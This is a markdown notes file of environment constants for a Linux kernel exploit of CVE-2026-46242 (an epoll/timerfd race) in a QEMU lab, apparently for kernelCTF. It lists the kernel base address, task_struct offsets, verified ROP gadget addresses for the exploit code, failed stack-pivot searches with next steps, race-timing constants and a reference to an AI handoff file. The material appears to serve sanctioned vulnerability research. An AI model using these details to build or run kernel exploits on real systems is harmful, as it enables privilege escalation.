# Tier 1 Environment Constants & Offsets

This document serves as a consolidated reference for all environment-specific variables, memory addresses, and struct offsets discovered during the Tier 1 QEMU execution of CVE-2026-46242. 

These values override the default generic exploit framework configurations.

## 1. Target Fingerprint
* **Kernel Build String (from `/proc/version`):** `Linux version 6.12.67 (legion@fedora)`
* **Target DB ID (kernelctf.kxdb):** `lts-6.12.67`

## 2. KASLR & Memory Addresses
* **KASLR Status:** Disabled (`nokaslr`)
* **Hardcoded Kernel Base:** `0xffffffff81000000`
* **Failed Stack Pivot Gadget (AT&T syntax trap):** `0xffffffff820d6525`

## 3. `task_struct` Offsets (Mapped via GDB)
Google's default offsets did not match our local build. These are the reversed offsets for our specific `vmlinux` binary.

| Field | Google's Default Offset | Our Custom Offset | Purpose |
| :--- | :--- | :--- | :--- |
| `comm` | 1928 | **1840** | Reading the command name to verify AAR |
| `files` | 1984 | **1896** | Locating open file descriptors |
| `children` | 1472 | **1384** | Walking the process tree |
| `sibling` | 1488 | **1400** | Walking the process tree |

## 4. Gadget Research Findings (2026-07-09 Session)

### Kernel Config Flags Affecting ROP
* **CONFIG_RETPOLINE**: **ENABLED** — All `ret` replaced by `jmp __x86_return_thunk`
* **`__x86_return_thunk`** address: `0xffffffff820d6e70` (starts with `c3` = `ret`)
* **Indirect call thunk**: `__x86_indirect_thunk_array` at `0xffffffff820d6240`

### Verified Gadgets (use these in exploit.cpp)
| Define | Offset | Absolute Addr | Instruction | Status |
|--------|--------|---------------|-------------|--------|
| `POP_RDI_RET` | `0x1600ea0` | `0xffffffff81600ea0` | `pop rdi ; jmp __x86_return_thunk` | ✅ VALID |
| `POP_RET` | `0x42010` | `0xffffffff81042010` | `ret` (bare c3) | ✅ VALID |
| (Alt pop rdi) | `0x106114e` | `0xffffffff8206114e` | `pop rdi ; jmp __x86_return_thunk` | ✅ VALID |

### PIVOT1 Research — What Does NOT Exist in This Kernel
All of the following were searched with boundary-aligned Python script (8.5M lines of objdump output):
* `mov rsp, rdi` (any suffix) → **NONE**
* `mov rsp, rdx` (any suffix) → **NONE**  
* `xchg rsp, rdi` or `xchg rsp, rdx` → **NONE**
* `push rdi ; pop rsp` → **NONE**
* `push rdx ; pop rsp` → **NONE**
* `mov rsp, [rdi+X]` or `mov rsp, [rdx+X]` → **NONE**
* `mov rax,[rdx+X] ; mov rdi,rdx ; jmp rax` (COS JOP style) → **NONE**
* `mov rax,[rdx+X] ; ... ; jmp rax` (within 5 instructions) → **NONE**

### PIVOT1 Research — What to Try Next
* `push rdi ; jmp __x86_return_thunk` — **NOT YET SEARCHED** (most promising)
* `sub rsp, 0xXXX` gadgets — **NOT YET SEARCHED**  
* See `exploit/tier1-linux-vm/AI_HANDOFF.md` for exact search commands.

### Failed Gadget
* `PIVOT1 = 0x10d6525` (`0xffffffff820d6525`) → actual instruction: `mov QWORD PTR [rsp],rdi`
  This WRITES to memory at rsp — it's a store instruction, NOT a stack pivot.

## 5. Race Condition Calibration Constants
The nested QEMU environment required custom time threshold constants for the `epoll` vs `timerfd` race condition.

* **`RACE_DUP_CLOSE_ITERS` (Cache Bouncing Delay):** **20** (Original: 250)
* **`RACE_AHEAD_HI` (Timer Interrupt Search Window):** **10000ns** (Original: 4000ns)
* **Timeout Window:** **600 seconds** (Original: 300 seconds)
